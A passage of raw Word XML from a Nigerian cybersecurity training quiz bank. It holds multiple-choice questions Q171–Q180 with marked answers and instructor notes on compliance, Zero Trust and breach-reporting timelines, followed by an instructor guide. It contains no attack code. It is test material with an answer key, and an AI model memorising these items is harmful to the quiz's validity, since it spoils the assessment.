        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* NDPC = established by NDPA 2023 as the independent data protection regulator. Replaced NITDA's previous data protection role. Maximum fine: ₦10M or 2% of annual gross revenue.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q171</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Zero Trust Architecture is based on the principle:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Zero risk exists when all systems are fully patched</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Only external traffic requires authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Internal networks should have no security controls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Never trust, always verify" — no user or device is trusted by default, even inside the network</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Zero Trust dismantles the "castle and moat" model. Every access request is authenticated, authorised, and encrypted regardless of network location.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q172</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PCI DSS (Payment Card Industry Data Security Standard) applies to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Only banks that issue Visa and Mastercard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Any organisation that stores, processes, or transmits payment card data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Only companies with more than 1 million transactions per year</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Nigerian fintechs only when processing international transactions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* PCI DSS applies to ALL merchants and processors — from small e-commerce sites to major banks. Non-compliance = fines + loss of card processing ability.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q173</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is "threat intelligence" in cybersecurity operations?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Automated scanning of a network to find active threats</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Intelligence gathered by hacking into threat actor systems</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Contextual information about current threats, attackers, their methods, and indicators of compromise</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Employee training about recognising phishing threats</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Threat intel = who is attacking, how, and what IOCs to look for. Strategic (trends), tactical (TTPs), operational (specific campaigns), technical (IOCs). Feeds into SIEM and SOC decisions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q174</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which risk treatment option involves buying cyber insurance?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Risk Avoidance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Risk Reduction (Mitigation)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Risk Acceptance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Risk Transfer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Four options: Avoid (stop the risky activity), Mitigate (reduce likelihood/impact), Transfer (insurance/outsource), Accept (acknowledge and tolerate). Insurance = transfer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q175</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ngCERT is Nigeria's national computer emergency response team. Its primary role is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Arresting cybercriminals operating in Nigeria</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Regulating internet service providers in Nigeria</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Issuing cybersecurity certifications to Nigerian professionals</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Coordinating national cyber incident response and issuing threat advisories to Nigerian organisations</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* ngCERT publishes threat advisories, coordinates with global CERTs, and is the recommended point of contact for reporting major national cyber incidents.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q176</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Post-quantum cryptography is being developed because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Classical computers have become too slow to run current encryption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The internet requires faster encryption for 5G networks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sufficiently powerful quantum computers could break RSA and ECC encryption using Shor's algorithm</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Current encryption algorithms are vulnerable to AI-based cracking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Shor's algorithm (1994) theoretically breaks RSA/ECC on quantum hardware. NIST finalised first post-quantum standards in 2024: CRYSTALS-Kyber, CRYSTALS-Dilithium, SPHINCS+.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q177</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AI is being used by attackers to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Automatically patch vulnerabilities before defenders can</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Only perform automated DDoS attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Generate more convincing phishing emails, create polymorphic malware, and automate vulnerability discovery</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Decrypt AES-256 encrypted communications in real time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* WormGPT/FraudGPT = uncensored LLMs for cybercrime. Deepfake audio used in CEO fraud. AI lowers the bar for sophisticated attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q178</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which CBN framework requires Nigerian banks to report cyber incidents within 24 hours?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) CBN Consumer Protection Framework 2016</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) CBN Risk-Based Supervision Framework</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CBN Cybersecurity Framework for Banks and Other Financial Institutions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) CBN Cashless Policy Implementation Guidelines</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* CBN Cybersecurity Framework (2018 + 2021 update) = mandatory for all CBN-regulated institutions. 24-hour incident reporting, annual penetration testing, CISO appointment required.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q179</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A CISO presenting to the board of directors should frame cybersecurity risk in terms of:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Technical CVE scores and patch percentages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Number of alerts generated by the SIEM per month</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Lines of code reviewed in the security audit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Business impact: potential financial losses, regulatory fines, reputational damage, and operational disruption</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Critical] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Boards understand ₦, not CVEs. "A successful breach could result in ₦500M regulatory fine and 30% customer churn" lands better than "we have 47 critical vulnerabilities."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q180</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A Lagos-based fintech company processes 2 million card transactions per month. They experience a breach exposing 450,000 customer card numbers. Which THREE regulatory obligations apply simultaneously, and what are the timelines?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) ISO 27001 recertification (60 days); NCC licence suspension (immediate); Cybercrimes Act prosecution (ongoing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) PCI DSS incident report (7 days); NDPA NDPC notification (72 hours); ngCERT advisory (optional)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NDPA 2023 — notify NDPC within 72 hours (personal data breach); CBN Cybersecurity Framework — notify CBN within 24 hours (financial institution cyber incident); PCI DSS — notify card brands and acquiring bank immediately, formal report within defined window</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Cybercrimes Act report (48 hours); NITDA notification (72 hours); NCC licence review (30 days)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* The capstone regulatory scenario — three frameworks apply simultaneously: NDPA (personal data), CBN (banking sector), PCI DSS (card data). A CISO at a Nigerian fintech must know all three. Debrief: this scenario has played out at real Nigerian fintechs. Not knowing the obligations = compounding the regulatory exposure on top of the technical breach. Fit close with: "This is why you exist. This is what MetaBridge prepared you for."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>INSTRUCTOR GUIDE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>High-Energy Moments to Watch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q15</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — CIA Triad + NDPA 2023 combined (two-part answer): Expect class debate. Use as discussion anchor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q30</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — SYN flood at a Nigerian bank: Live Wireshark demo right before this question creates maximum impact.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q45</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — The chmod 777 /etc/passwd disaster: Students who made this mistake in labs will recognise themselves. Make it safe to laugh.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q60</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Triple cryptography failure scenario: Pause, build suspense, then reveal three errors. "Three strikes — is your developer still employed?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q75</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Shodan + Cybercrimes Act grey area: Genuine classroom debate. Passive scanning legality is contested. Don't rush to "correct" answer — let students reason through it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q90</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Authorised pentest + NDPA 2023: The advanced ethical/legal question. Only senior students will get this right. Great discussion starter for compliance careers.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q105</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Triple OWASP/API identification: Use this for API security role-play scenario after the quiz.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q120</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — BEC domain typosquat: Ask "Who would have approved this transfer without noticing?" — creates reflection without blame.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q135</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — MITRE ATT&amp;CK kill chain mapping: Do this as a group exercise — draw the chain on the whiteboard while discussing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q150</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Dual Nigerian regulatory timeline (CBN + NDPC): Memorise both. Will be on the certification exam.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q165</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Three fintech mobile vulnerabilities ranked by severity: "Has anyone checked their banking app for these today?" Great call to action.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q180</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Three-framework regulatory collision: The ultimate capstone question. "This is why you exist."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Session Management Tips</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>For 45-minute Kahoot sessions (15 questions):</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Questions 1–10: Quick recall to warm up (20–30 s each)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Questions 11–14: Concept/scenario questions (45–60 s each)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Question 15 ★: Double-points finale — build suspense, announce before playing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Managing time:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Skip [CRITICAL] questions if running behind — they eat 90–120 s with debrief</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Always debrief the double-point question — it drives the most learning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Leaderboard psychology:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Display leaderboard after Q5, Q10, Q15 (dramatic reveals)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use "Incorrect but closest" shoutout to reward partial understanding</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Never mock wrong answers — celebrate the learning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Common Wrong-Answer Patterns to Address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Question Topic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Common Wrong Answer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Teaching Moment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CIA Triad violations</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Students pick "Integrity" for availability failures</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Draw the three-circle diagram, label each</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Encryption vs Hashing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
